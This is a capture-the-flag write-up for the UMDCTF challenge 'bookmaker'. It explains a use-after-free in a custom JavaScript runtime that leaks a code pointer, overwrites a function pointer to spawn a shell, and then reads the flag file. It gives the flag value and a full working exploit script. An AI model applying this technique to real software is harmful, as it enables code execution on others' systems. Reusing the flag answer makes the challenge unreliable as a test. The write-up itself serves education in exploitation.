# bookmaker

Flag: `UMDCTF{tahmid-will-surely-finish_his_challenge_on_time!!}`

## Summary

The service is a custom JavaScript runtime with several native helpers:

- `new Ledger(size)` allocates a native buffer.
- `ledger.view()` returns an `ArrayBuffer` alias to that native buffer.
- `ledger.recycle()` frees the native buffer.
- `mintWire()` allocates a native ticket record used by `wireRead` / `wireWrite`.
- `settle(msg)` calls a global resolver function.

The bug is a use-after-free:

1. Allocate `new Ledger(0x30)`.
2. Keep the `ArrayBuffer` returned by `ledger.view()`.
3. Call `ledger.recycle()` to free the native 0x30 chunk.
4. Call `mintWire()`.

Because the ticket record is also 0x30 bytes, the freed ledger chunk is reused for the ticket. The stale `ArrayBuffer` now aliases the live ticket struct.

## Ticket layout

Reusing a `Ledger(0x30)` chunk over a freshly minted ticket reveals:

- `+0x00`: `dst` pointer
- `+0x08`: `size`
- `+0x10`: magic
- `+0x18`: resolver pointer, initially the NO handler at `base + 0xb390`
- `+0x20`: `0x40`
- `+0x28`: magic

That immediately gives a PIE leak from `u[24:32]`.

## Exploit

`settle()` does not use the ticket directly. Instead it calls a global function pointer at `base + 0xcc108`.

There is also a built-in YES handler at `base + 0xb3c4` that prints:

- `market resolved YES: ...`

and then calls `system("/bin/sh")`.

So the exploit is:

1. Overlap a stale `Ledger(0x30)` view with a minted ticket.
2. Read the leaked NO-handler pointer from offset `0x18`.
3. Compute:
   - `base = no - 0xb390`
   - `yes = base + 0xb3c4`
   - `dispatch = base + 0xcc108`
4. Overwrite the ticket’s `dst` pointer with `dispatch`.
5. Use `wireWrite(id, buf)` to write `yes` into that global function pointer.
6. Call `settle("x")` to jump into the YES handler and spawn `/bin/sh`.
7. Send `cat /app/flag.txt`.

## Minimal exploit script

```javascript
let l = new Ledger(0x30);
let ab = l.view();
let u = new Uint8Array(ab);
l.recycle();
let id = mintWire();

function rd64(off) {
  let v = 0n;
  for (let i = 0; i < 8; i++) v |= BigInt(u[off + i]) << (8n * BigInt(i));
  return v;
}

function wr64(off, v) {
  for (let i = 0; i < 8; i++) u[off + i] = Number((v >> (8n * BigInt(i))) & 0xffn);
}

let no = rd64(24);
let base = no - 0xb390n;
let yes = base + 0xb3c4n;
let dispatch = base + 0xcc108n;

wr64(0, dispatch);
let p = new ArrayBuffer(8);
new DataView(p).setBigUint64(0, yes, true);
wireWrite(id, p);
settle("x");
__END_MARKET_SCRIPT__
```

After the end marker, send:

```sh
cat /app/flag.txt
exit
```
